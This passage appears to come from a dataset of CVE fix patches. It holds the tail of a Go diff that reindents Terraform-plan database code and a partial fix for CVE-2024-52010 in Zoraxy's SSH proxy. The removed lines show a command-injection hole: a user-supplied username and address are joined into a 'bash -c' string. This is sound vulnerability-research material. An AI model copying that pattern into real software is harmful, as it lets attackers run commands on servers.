resourceType != \"\" {\n-\t\tquery = query.Where(\"resources.type = ?\", resourceType)\n-\t}\n-\n-\trows, err := query.Rows()\n-\tif err != nil {\n-\t\treturn results, err\n-\t}\n-\tdefer rows.Close()\n-\n-\tfor rows.Next() {\n-\t\tvar t string\n-\t\tif err = rows.Scan(&t); err != nil {\n-\t\t\treturn\n-\t\t}\n-\t\tresults = append(results, t)\n-\t}\n-\n-\treturn\n+        query := db.Table(\"attributes\").\n+                Select(\"DISTINCT key\").\n+                Joins(\"JOIN resources ON attributes.resource_id = resources.id\")\n+\n+        if resourceType != \"\" {\n+                query = query.Where(\"resources.type = ?\", resourceType)\n+        }\n+\n+        rows, err := query.Rows()\n+        if err != nil {\n+                return results, err\n+        }\n+        defer rows.Close()\n+\n+        for rows.Next() {\n+                var t string\n+                if err = rows.Scan(&t); err != nil {\n+                        return\n+                }\n+                results = append(results, t)\n+        }\n+\n+        return\n }\n \n // InsertPlan inserts a Terraform plan with associated information in the Database\n func (db *Database) InsertPlan(plan []byte) error {\n-\tvar lineage types.Lineage\n-\tif err := json.Unmarshal(plan, &lineage); err != nil {\n-\t\treturn err\n-\t}\n-\n-\t// Recover lineage from db if it's already exists or insert it\n-\tres := db.FirstOrCreate(&lineage, lineage)\n-\tif res.Error != nil {\n-\t\treturn fmt.Errorf(\"Error on lineage retrival during plan insertion: %v\", res.Error)\n-\t}\n-\n-\tvar p types.Plan\n-\tif err := json.Unmarshal(plan, &p); err != nil {\n-\t\treturn err\n-\t}\n-\tif err := json.Unmarshal(p.PlanJSON, &p.ParsedPlan); err != nil {\n-\t\treturn err\n-\t}\n-\n-\tp.LineageID = lineage.ID\n-\treturn db.Create(&p).Error\n+        var lineage types.Lineage\n+        if err := json.Unmarshal(plan, &lineage); err != nil {\n+                return err\n+        }\n+\n+        // Recover lineage from db if it's already exists or insert it\n+        res := db.FirstOrCreate(&lineage, lineage)\n+        if res.Error != nil {\n+                return fmt.Errorf(\"Error on lineage retrival during plan insertion: %v\", res.Error)\n+        }\n+\n+        var p types.Plan\n+        if err := json.Unmarshal(plan, &p); err != nil {\n+                return err\n+        }\n+        if err := json.Unmarshal(p.PlanJSON, &p.ParsedPlan); err != nil {\n+                return err\n+        }\n+\n+        p.LineageID = lineage.ID\n+        return db.Create(&p).Error\n }\n \n // GetPlansSummary retrieves a summary of all Plans of a lineage from the database\n func (db *Database) GetPlansSummary(lineage, limitStr, pageStr string) (plans []types.Plan, page int, total int) {\n-\tvar whereClause []interface{}\n-\tvar whereClauseTotal string\n-\tif lineage != \"\" {\n-\t\twhereClause = append(whereClause, `\"Lineage\".\"value\" = ?`, lineage)\n-\t\twhereClauseTotal = ` JOIN lineages on lineages.id=t.lineage_id WHERE lineages.value = ?`\n-\t}\n-\n-\trow := db.Raw(\"SELECT count(*) FROM plans AS t\"+whereClauseTotal, lineage).Row()\n-\tif err := row.Scan(&total); err != nil {\n-\t\tlog.Error(err.Error())\n-\t}\n-\n-\tvar limit int\n-\tif limitStr == \"\" {\n-\t\tlimit = -1\n-\t} else {\n-\t\tvar err error\n-\t\tlimit, err = strconv.Atoi(limitStr)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"GetPlans limit ignored: %v\", err)\n-\t\t\tlimit = -1\n-\t\t}\n-\t}\n-\n-\tvar offset int\n-\tif pageStr == \"\" {\n-\t\toffset = -1\n-\t} else {\n-\t\tvar err error\n-\t\tpage, err = strconv.Atoi(pageStr)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"GetPlans offset ignored: %v\", err)\n-\t\t} else {\n-\t\t\toffset = (page - 1) * pageSize\n-\t\t}\n-\t}\n-\n-\tdb.Select(`\"plans\".\"id\"`, `\"plans\".\"created_at\"`, `\"plans\".\"updated_at\"`, `\"plans\".\"tf_version\"`,\n-\t\t`\"plans\".\"git_remote\"`, `\"plans\".\"git_commit\"`, `\"plans\".\"ci_url\"`, `\"plans\".\"source\"`, `\"plans\".\"exit_code\"`).\n-\t\tJoins(\"Lineage\").\n-\t\tOrder(\"created_at desc\").\n-\t\tLimit(limit).\n-\t\tOffset(offset).\n-\t\tFind(&plans, whereClause...)\n-\n-\treturn\n+        var whereClause []interface{}\n+        var whereClauseTotal string\n+        if lineage != \"\" {\n+                whereClause = append(whereClause, `\"Lineage\".\"value\" = ?`, lineage)\n+                whereClauseTotal = ` JOIN lineages on lineages.id=t.lineage_id WHERE lineages.value = ?`\n+        }\n+\n+        row := db.Raw(\"SELECT count(*) FROM plans AS t\"+whereClauseTotal, lineage).Row()\n+        if err := row.Scan(&total); err != nil {\n+                log.Error(err.Error())\n+        }\n+\n+        var limit int\n+        if limitStr == \"\" {\n+                limit = -1\n+        } else {\n+                var err error\n+                limit, err = strconv.Atoi(limitStr)\n+                if err != nil {\n+                        log.Warnf(\"GetPlans limit ignored: %v\", err)\n+                        limit = -1\n+                }\n+        }\n+\n+        var offset int\n+        if pageStr == \"\" {\n+                offset = -1\n+        } else {\n+                var err error\n+                page, err = strconv.Atoi(pageStr)\n+                if err != nil {\n+                        log.Warnf(\"GetPlans offset ignored: %v\", err)\n+                } else {\n+                        offset = (page - 1) * pageSize\n+                }\n+        }\n+\n+        db.Select(`\"plans\".\"id\"`, `\"plans\".\"created_at\"`, `\"plans\".\"updated_at\"`, `\"plans\".\"tf_version\"`,\n+                `\"plans\".\"git_remote\"`, `\"plans\".\"git_commit\"`, `\"plans\".\"ci_url\"`, `\"plans\".\"source\"`, `\"plans\".\"exit_code\"`).\n+                Joins(\"Lineage\").\n+                Order(\"created_at desc\").\n+                Limit(limit).\n+                Offset(offset).\n+                Find(&plans, whereClause...)\n+\n+        return\n }\n \n // GetPlan retrieves a specific Plan by his ID from the database\n func (db *Database) GetPlan(id string) (plans types.Plan) {\n-\tdb.Joins(\"Lineage\").\n-\t\tPreload(\"ParsedPlan\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateModules\").\n-\t\tPreload(\"ParsedPlan.Variables\").\n-\t\tPreload(\"ParsedPlan.PlanResourceChanges\").\n-\t\tPreload(\"ParsedPlan.PlanResourceChanges.Change\").\n-\t\tPreload(\"ParsedPlan.PlanOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanOutputs.Change\").\n-\t\tPreload(\"ParsedPlan.PlanState\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateModules\").\n-\t\tFind(&plans, `\"plans\".\"id\" = ?`, id)\n-\n-\treturn\n+        db.Joins(\"Lineage\").\n+                Preload(\"ParsedPlan\").\n+                Preload(\"ParsedPlan.PlanStateValue\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateOutputs\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateModules\").\n+                Preload(\"ParsedPlan.Variables\").\n+                Preload(\"ParsedPlan.PlanResourceChanges\").\n+                Preload(\"ParsedPlan.PlanResourceChanges.Change\").\n+                Preload(\"ParsedPlan.PlanOutputs\").\n+                Preload(\"ParsedPlan.PlanOutputs.Change\").\n+                Preload(\"ParsedPlan.PlanState\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateOutputs\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateModules\").\n+                Find(&plans, `\"plans\".\"id\" = ?`, id)\n+\n+        return\n }\n \n // GetPlans retrieves all Plan of a lineage from the database\n func (db *Database) GetPlans(lineage, limitStr, pageStr string) (plans []types.Plan, page int, total int) {\n-\tvar whereClause []interface{}\n-\tvar whereClauseTotal string\n-\tif lineage != \"\" {\n-\t\twhereClause = append(whereClause, `\"Lineage\".\"value\" = ?`, lineage)\n-\t\twhereClauseTotal = ` JOIN lineages on lineages.id=t.lineage_id WHERE lineages.value = ?`\n-\t}\n-\n-\trow := db.Raw(\"SELECT count(*) FROM plans AS t\"+whereClauseTotal, lineage).Row()\n-\tif err := row.Scan(&total); err != nil {\n-\t\tlog.Error(err.Error())\n-\t}\n-\n-\tvar limit int\n-\tif limitStr == \"\" {\n-\t\tlimit = -1\n-\t} else {\n-\t\tvar err error\n-\t\tlimit, err = strconv.Atoi(limitStr)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"GetPlans limit ignored: %v\", err)\n-\t\t\tlimit = -1\n-\t\t}\n-\t}\n-\n-\tvar offset int\n-\tif pageStr == \"\" {\n-\t\toffset = -1\n-\t} else {\n-\t\tvar err error\n-\t\tpage, err = strconv.Atoi(pageStr)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"GetPlans offset ignored: %v\", err)\n-\t\t} else {\n-\t\t\toffset = (page - 1) * pageSize\n-\t\t}\n-\t}\n-\n-\tdb.Joins(\"Lineage\").\n-\t\tPreload(\"ParsedPlan\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n-\t\tPreload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateModules\").\n-\t\tPreload(\"ParsedPlan.Variables\").\n-\t\tPreload(\"ParsedPlan.PlanResourceChanges\").\n-\t\tPreload(\"ParsedPlan.PlanResourceChanges.Change\").\n-\t\tPreload(\"ParsedPlan.PlanOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanOutputs.Change\").\n-\t\tPreload(\"ParsedPlan.PlanState\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateOutputs\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n-\t\tPreload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateModules\").\n-\t\tOrder(\"created_at desc\").\n-\t\tLimit(limit).\n-\t\tOffset(offset).\n-\t\tFind(&plans, whereClause...)\n-\n-\treturn\n+        var whereClause []interface{}\n+        var whereClauseTotal string\n+        if lineage != \"\" {\n+                whereClause = append(whereClause, `\"Lineage\".\"value\" = ?`, lineage)\n+                whereClauseTotal = ` JOIN lineages on lineages.id=t.lineage_id WHERE lineages.value = ?`\n+        }\n+\n+        row := db.Raw(\"SELECT count(*) FROM plans AS t\"+whereClauseTotal, lineage).Row()\n+        if err := row.Scan(&total); err != nil {\n+                log.Error(err.Error())\n+        }\n+\n+        var limit int\n+        if limitStr == \"\" {\n+                limit = -1\n+        } else {\n+                var err error\n+                limit, err = strconv.Atoi(limitStr)\n+                if err != nil {\n+                        log.Warnf(\"GetPlans limit ignored: %v\", err)\n+                        limit = -1\n+                }\n+        }\n+\n+        var offset int\n+        if pageStr == \"\" {\n+                offset = -1\n+        } else {\n+                var err error\n+                page, err = strconv.Atoi(pageStr)\n+                if err != nil {\n+                        log.Warnf(\"GetPlans offset ignored: %v\", err)\n+                } else {\n+                        offset = (page - 1) * pageSize\n+                }\n+        }\n+\n+        db.Joins(\"Lineage\").\n+                Preload(\"ParsedPlan\").\n+                Preload(\"ParsedPlan.PlanStateValue\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateOutputs\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n+                Preload(\"ParsedPlan.PlanStateValue.PlanStateModule.PlanStateModules\").\n+                Preload(\"ParsedPlan.Variables\").\n+                Preload(\"ParsedPlan.PlanResourceChanges\").\n+                Preload(\"ParsedPlan.PlanResourceChanges.Change\").\n+                Preload(\"ParsedPlan.PlanOutputs\").\n+                Preload(\"ParsedPlan.PlanOutputs.Change\").\n+                Preload(\"ParsedPlan.PlanState\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateOutputs\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateResources.PlanStateResourceAttributes\").\n+                Preload(\"ParsedPlan.PlanState.PlanStateValue.PlanStateModule.PlanStateModules\").\n+                Order(\"created_at desc\").\n+                Limit(limit).\n+                Offset(offset).\n+                Find(&plans, whereClause...)\n+\n+        return\n }\n \n // GetLineages retrieves all Lineage from the database\n func (db *Database) GetLineages(limitStr string) (lineages []types.Lineage) {\n-\tvar limit int\n-\tif limitStr == \"\" {\n-\t\tlimit = -1\n-\t} else {\n-\t\tvar err error\n-\t\tlimit, err = strconv.Atoi(limitStr)\n-\t\tif err != nil {\n-\t\t\tlog.Warnf(\"GetLineages limit ignored: %v\", err)\n-\t\t\tlimit = -1\n-\t\t}\n-\t}\n-\n-\tdb.Order(\"created_at desc\").\n-\t\tLimit(limit).\n-\t\tFind(&lineages)\n-\treturn\n+        var limit int\n+        if limitStr == \"\" {\n+                limit = -1\n+        } else {\n+                var err error\n+                limit, err = strconv.Atoi(limitStr)\n+                if err != nil {\n+                        log.Warnf(\"GetLineages limit ignored: %v\", err)\n+                        limit = -1\n+                }\n+        }\n+\n+        db.Order(\"created_at desc\").\n+                Limit(limit).\n+                Find(&lineages)\n+        return\n }\n \n // DefaultVersion returns the default VersionID for a given Lineage\n // Copied and adapted from github.com/hashicorp/terraform/command/jsonstate/state.go\n func (db *Database) DefaultVersion(lineage string) (version string, err error) {\n-\tsqlQuery := \"SELECT versions.version_id FROM\" +\n-\t\t\" (SELECT states.path, max(states.serial) as mx FROM states GROUP BY states.path) t\" +\n-\t\t\" JOIN states ON t.path = states.path AND t.mx = states.serial\" +\n-\t\t\" JOIN versions on states.version_id=versions.id\" +\n-\t\t\" JOIN lineages on lineages.id=states.lineage_id\" +\n-\t\t\" WHERE lineages.value = ?\" +\n-\t\t\" ORDER BY versions.last_modified DESC\"\n-\n-\trow := db.Raw(sqlQuery, lineage).Row()\n-\terr = row.Scan(&version)\n-\treturn\n+        sqlQuery := \"SELECT versions.version_id FROM\" +\n+                \" (SELECT states.path, max(states.serial) as mx FROM states GROUP BY states.path) t\" +\n+                \" JOIN states ON t.path = states.path AND t.mx = states.serial\" +\n+                \" JOIN versions on states.version_id=versions.id\" +\n+                \" JOIN lineages on lineages.id=states.lineage_id\" +\n+                \" WHERE lineages.value = ?\" +\n+                \" ORDER BY versions.last_modified DESC\"\n+\n+        row := db.Raw(sqlQuery, lineage).Row()\n+        err = row.Scan(&version)\n+        return\n }\n \n // Close get generic database interface *sql.DB from the current *gorm.DB\n // and close it\n func (db *Database) Close() {\n-\tsqlDb, err := db.DB.DB()\n-\tif err != nil {\n-\t\tlog.Fatalf(\"Unable to terminate db instance: %v\\n\", err)\n-\t}\n-\tsqlDb.Close()\n+        sqlDb, err := db.DB.DB()\n+        if err != nil {\n+                log.Fatalf(\"Unable to terminate db instance: %v\\n\", err)\n+        }\n+        sqlDb.Close()\n }\n"}
{"cve":"CVE-2024-52010:0708", "fix_patch": "diff --git a/src/mod/sshprox/sshprox.go b/src/mod/sshprox/sshprox.go\nindex ed1b92c..e41aaf4 100644\n--- a/src/mod/sshprox/sshprox.go\n+++ b/src/mod/sshprox/sshprox.go\n@@ -1,215 +1,214 @@\n package sshprox\n \n import (\n-\t\"errors\"\n-\t\"fmt\"\n-\t\"log\"\n-\t\"net/http\"\n-\t\"net/url\"\n-\t\"os\"\n-\t\"os/exec\"\n-\t\"path/filepath\"\n-\t\"runtime\"\n-\t\"strconv\"\n-\t\"strings\"\n-\n-\t\"github.com/google/uuid\"\n-\t\"imuslab.com/zoraxy/mod/reverseproxy\"\n-\t\"imuslab.com/zoraxy/mod/utils\"\n-\t\"imuslab.com/zoraxy/mod/websocketproxy\"\n+        \"errors\"\n+        \"fmt\"\n+        \"log\"\n+        \"net/http\"\n+        \"net/url\"\n+        \"os\"\n+        \"os/exec\"\n+        \"path/filepath\"\n+        \"runtime\"\n+        \"strconv\"\n+        \"strings\"\n+\n+        \"github.com/google/uuid\"\n+        \"imuslab.com/zoraxy/mod/reverseproxy\"\n+        \"imuslab.com/zoraxy/mod/utils\"\n+        \"imuslab.com/zoraxy/mod/websocketproxy\"\n )\n \n /*\n-\tSSH Proxy\n+        SSH Proxy\n \n-\tThis is a tool to bind gotty into Zoraxy\n-\tso that you can do something similar to\n-\tonline ssh terminal\n+        This is a tool to bind gotty into Zoraxy\n+        so that you can do something similar to\n+        online ssh terminal\n */\n \n type Manager struct {\n-\tStartingPort int\n-\tInstances    []*Instance\n+        StartingPort int\n+        Instances    []*Instance\n }\n \n type Instance struct {\n-\tUUID         string\n-\tExecPath     string\n-\tRemoteAddr   string\n-\tRemotePort   int\n-\tAssignedPort int\n-\tconn         *reverseproxy.ReverseProxy //HTTP proxy\n-\ttty          *exec.Cmd                  //SSH connection ported to web interface\n-\tParent       *Manager\n+        UUID         string\n+        ExecPath     string\n+        RemoteAddr   string\n+        RemotePort   int\n+        AssignedPort int\n+        conn         *reverseproxy.ReverseProxy //HTTP proxy\n+        tty          *exec.Cmd                  //SSH connection ported to web interface\n+        Parent       *Manager\n }\n \n func NewSSHProxyManager() *Manager {\n-\treturn &Manager{\n-\t\tStartingPort: 14810,\n-\t\tInstances:    []*Instance{},\n-\t}\n+        return &Manager{\n+                StartingPort: 14810,\n+                Instances:    []*Instance{},\n+        }\n }\n \n // Get the next free port in the list\n func (m *Manager) GetNextPort() int {\n-\tnextPort := m.StartingPort\n-\toccupiedPort := make(map[int]bool)\n-\tfor _, instance := range m.Instances {\n-\t\toccupiedPort[instance.AssignedPort] = true\n-\t}\n-\tfor {\n-\t\tif !occupiedPort[nextPort] {\n-\t\t\treturn nextPort\n-\t\t}\n-\t\tnextPort++\n-\t}\n+        nextPort := m.StartingPort\n+        occupiedPort := make(map[int]bool)\n+        for _, instance := range m.Instances {\n+                occupiedPort[instance.AssignedPort] = true\n+        }\n+        for {\n+                if !occupiedPort[nextPort] {\n+                        return nextPort\n+                }\n+                nextPort++\n+        }\n }\n \n func (m *Manager) HandleHttpByInstanceId(instanceId string, w http.ResponseWriter, r *http.Request) {\n-\ttargetInstance, err := m.GetInstanceById(instanceId)\n-\tif err != nil {\n-\t\thttp.Error(w, err.Error(), http.StatusNotFound)\n-\t\treturn\n-\t}\n-\n-\tif targetInstance.tty == nil {\n-\t\t//Server side already closed\n-\t\thttp.Error(w, \"Connection already closed\", http.StatusInternalServerError)\n-\t\treturn\n-\t}\n-\n-\tr.Header.Set(\"X-Forwarded-Host\", r.Host)\n-\trequestURL := r.URL.String()\n-\tif r.Header[\"Upgrade\"] != nil && strings.ToLower(r.Header[\"Upgrade\"][0]) == \"websocket\" {\n-\t\t//Handle WebSocket request. Forward the custom Upgrade header and rewrite origin\n-\t\tr.Header.Set(\"Zr-Origin-Upgrade\", \"websocket\")\n-\t\trequestURL = strings.TrimPrefix(requestURL, \"/\")\n-\t\tu, _ := url.Parse(\"ws://127.0.0.1:\" + strconv.Itoa(targetInstance.AssignedPort) + \"/\" + requestURL)\n-\t\twspHandler := websocketproxy.NewProxy(u, websocketproxy.Options{\n-\t\t\tSkipTLSValidation: false,\n-\t\t\tSkipOriginCheck:   false,\n-\t\t\tLogger:            nil,\n-\t\t})\n-\t\twspHandler.ServeHTTP(w, r)\n-\t\treturn\n-\t}\n-\n-\ttargetInstance.conn.ProxyHTTP(w, r)\n+        targetInstance, err := m.GetInstanceById(instanceId)\n+        if err != nil {\n+                http.Error(w, err.Error(), http.StatusNotFound)\n+                return\n+        }\n+\n+        if targetInstance.tty == nil {\n+                //Server side already closed\n+                http.Error(w, \"Connection already closed\", http.StatusInternalServerError)\n+                return\n+        }\n+\n+        r.Header.Set(\"X-Forwarded-Host\", r.Host)\n+        requestURL := r.URL.String()\n+        if r.Header[\"Upgrade\"] != nil && strings.ToLower(r.Header[\"Upgrade\"][0]) == \"websocket\" {\n+                //Handle WebSocket request. Forward the custom Upgrade header and rewrite origin\n+                r.Header.Set(\"Zr-Origin-Upgrade\", \"websocket\")\n+                requestURL = strings.TrimPrefix(requestURL, \"/\")\n+                u, _ := url.Parse(\"ws://127.0.0.1:\" + strconv.Itoa(targetInstance.AssignedPort) + \"/\" + requestURL)\n+                wspHandler := websocketproxy.NewProxy(u, websocketproxy.Options{\n+                        SkipTLSValidation: false,\n+                        SkipOriginCheck:   false,\n+                        Logger:            nil,\n+                })\n+                wspHandler.ServeHTTP(w, r)\n+                return\n+        }\n+\n+        targetInstance.conn.ProxyHTTP(w, r)\n }\n \n func (m *Manager) GetInstanceById(instanceId string) (*Instance, error) {\n-\tfor _, instance := range m.Instances {\n-\t\tif instance.UUID == instanceId {\n-\t\t\treturn instance, nil\n-\t\t}\n-\t}\n-\treturn nil, fmt.Errorf(\"instance not found: %s\", instanceId)\n+        for _, instance := range m.Instances {\n+                if instance.UUID == instanceId {\n+                        return instance, nil\n+                }\n+        }\n+        return nil, fmt.Errorf(\"instance not found: %s\", instanceId)\n }\n func (m *Manager) NewSSHProxy(binaryRoot string) (*Instance, error) {\n-\t//Check if the binary exists in system/gotty/\n-\tbinary := \"gotty_\" + runtime.GOOS + \"_\" + runtime.GOARCH\n-\n-\tif runtime.GOOS == \"windows\" {\n-\t\tbinary = binary + \".exe\"\n-\t}\n-\n-\t//Extract it from embedfs if not exists locally\n-\texecPath := filepath.Join(binaryRoot, binary)\n-\n-\t//Create the storage folder structure\n-\tos.MkdirAll(filepath.Dir(execPath), 0775)\n-\n-\t//Create config file if not exists\n-\tif !utils.FileExists(filepath.Join(filepath.Dir(execPath), \".gotty\")) {\n-\t\tconfigFile, _ := gotty.ReadFile(\"gotty/.gotty\")\n-\t\tos.WriteFile(filepath.Join(filepath.Dir(execPath), \".gotty\"), configFile, 0775)\n-\t}\n-\n-\t//Create web.ssh binary if not exists\n-\tif !utils.FileExists(execPath) {\n-\t\t//Try to extract it from embedded fs\n-\t\texecutable, err := gotty.ReadFile(\"gotty/\" + binary)\n-\t\tif err != nil {\n-\t\t\t//Binary not found in embedded\n-\t\t\treturn nil, errors.New(\"platform not supported\")\n-\t\t}\n-\n-\t\t//Extract to target location\n-\t\terr = os.WriteFile(execPath, executable, 0777)\n-\t\tif err != nil {\n-\t\t\t//Binary not found in embedded\n-\t\t\tlog.Println(\"Extract web.ssh failed: \" + err.Error())\n-\t\t\treturn nil, errors.New(\"web.ssh sub-program extract failed\")\n-\t\t}\n-\t}\n-\n-\t//Convert the binary path to realpath\n-\trealpath, err := filepath.Abs(execPath)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tthisInstance := Instance{\n-\t\tUUID:         uuid.New().String(),\n-\t\tExecPath:     realpath,\n-\t\tAssignedPort: -1,\n-\t\tParent:       m,\n-\t}\n-\n-\tm.Instances = append(m.Instances, &thisInstance)\n-\n-\treturn &thisInstance, nil\n+        //Check if the binary exists in system/gotty/\n+        binary := \"gotty_\" + runtime.GOOS + \"_\" + runtime.GOARCH\n+\n+        if runtime.GOOS == \"windows\" {\n+                binary = binary + \".exe\"\n+        }\n+\n+        //Extract it from embedfs if not exists locally\n+        execPath := filepath.Join(binaryRoot, binary)\n+\n+        //Create the storage folder structure\n+        os.MkdirAll(filepath.Dir(execPath), 0775)\n+\n+        //Create config file if not exists\n+        if !utils.FileExists(filepath.Join(filepath.Dir(execPath), \".gotty\")) {\n+                configFile, _ := gotty.ReadFile(\"gotty/.gotty\")\n+                os.WriteFile(filepath.Join(filepath.Dir(execPath), \".gotty\"), configFile, 0775)\n+        }\n+\n+        //Create web.ssh binary if not exists\n+        if !utils.FileExists(execPath) {\n+                //Try to extract it from embedded fs\n+                executable, err := gotty.ReadFile(\"gotty/\" + binary)\n+                if err != nil {\n+                        //Binary not found in embedded\n+                        return nil, errors.New(\"platform not supported\")\n+                }\n+\n+                //Extract to target location\n+                err = os.WriteFile(execPath, executable, 0777)\n+                if err != nil {\n+                        //Binary not found in embedded\n+                        log.Println(\"Extract web.ssh failed: \" + err.Error())\n+                        return nil, errors.New(\"web.ssh sub-program extract failed\")\n+                }\n+        }\n+\n+        //Convert the binary path to realpath\n+        realpath, err := filepath.Abs(execPath)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        thisInstance := Instance{\n+                UUID:         uuid.New().String(),\n+                ExecPath:     realpath,\n+                AssignedPort: -1,\n+                Parent:       m,\n+        }\n+\n+        m.Instances = append(m.Instances, &thisInstance)\n+\n+        return &thisInstance, nil\n }\n \n // Create a new Connection to target address\n func (i *Instance) CreateNewConnection(listenPort int, username string, remoteIpAddr string, remotePort int) error {\n-\t//Create a gotty instance\n-\tconnAddr := remoteIpAddr\n-\tif username != \"\" {\n-\t\tconnAddr = username + \"@\" + remoteIpAddr\n-\t}\n-\tconfigPath := filepath.Join(filepath.Dir(i.ExecPath), \".gotty\")\n-\ttitle := username + \"@\" + remoteIpAddr\n-\tif remotePort != 22 {\n-\t\ttitle = title + \":\" + strconv.Itoa(remotePort)\n-\t}\n-\n-\tsshCommand := []string{\"ssh\", \"-t\", connAddr, \"-p\", strconv.Itoa(remotePort)}\n-\tcmd := exec.Command(i.ExecPath, \"-w\", \"-p\", strconv.Itoa(listenPort), \"--once\", \"--config\", configPath, \"--title-format\", title, \"bash\", \"-c\", strings.Join(sshCommand, \" \"))\n-\tcmd.Dir = filepath.Dir(i.ExecPath)\n-\tcmd.Env = append(os.Environ(), \"TERM=xterm\")\n-\tcmd.Stdout = os.Stdout\n-\tcmd.Stderr = os.Stderr\n-\tgo func() {\n-\t\tcmd.Run()\n-\t\ti.Destroy()\n-\t}()\n-\ti.tty = cmd\n-\ti.AssignedPort = listenPort\n-\ti.RemoteAddr = remoteIpAddr\n-\ti.RemotePort = remotePort\n-\n-\t//Create a new proxy agent for this root\n-\tpath, err := url.Parse(\"http://127.0.0.1:\" + strconv.Itoa(listenPort))\n-\tif err != nil {\n-\t\treturn err\n-\t}\n-\n-\t//Create new proxy objects to the proxy\n-\tproxy := reverseproxy.NewReverseProxy(path)\n-\n-\ti.conn = proxy\n-\treturn nil\n+        //Create a gotty instance\n+        connAddr := remoteIpAddr\n+        if username != \"\" {\n+                connAddr = username + \"@\" + remoteIpAddr\n+        }\n+        configPath := filepath.Join(filepath.Dir(i.ExecPath), \".gotty\")\n+        title := username + \"@\" + remoteIpAddr\n+        if remotePort != 22 {\n+                title = title + \":\" + strconv.Itoa(remotePort)\n+        }\n+\n+        cmd := exec.Command(i.ExecPath, \"-w\", \"-p\", strconv.Itoa(listenPort), \"--once\", \"--config\", configPath, \"--title-format\", title, \"ssh\", \"-t\", connAddr, \"-p\", strconv.Itoa(remotePort))\n+        cmd.Dir = filepath.Dir(i.ExecPath)\n+        cmd.Env = append(os.Environ(), \"TERM=xterm\")\n+        cmd.Stdout = os.Stdout\n+        cmd.Stderr = os.Stderr\n+        go func() {\n+                cmd.Run()\n+                i.Destroy()\n+        }()\n+        i.tty = cmd\n+        i.AssignedPort = listenPort\n+        i.RemoteAddr = remoteIpAddr\n+        i.RemotePort = remotePort\n+\n+        //Create a new proxy agent for this root\n+        path, err := url.Parse(\"http://127.0.0.1:\" + strconv.Itoa(listenPort))\n+        if err != nil {\n+                return err\n+        }\n+\n+        //Create new proxy objects to the proxy\n+        proxy := reverseproxy.NewReverseProxy(path)\n+\n+        i.conn = proxy\n+        return nil\n }\n \n func (i *Instance) Destroy() {\n-\t// Remove the instance from the Manager's Instances list\n-\tfor idx, inst := range i.Parent.Instances {\n-\t\tif inst == i {\n-\t\t\t// Remove the instance from the slice by swapping it with the last instance and slicing the 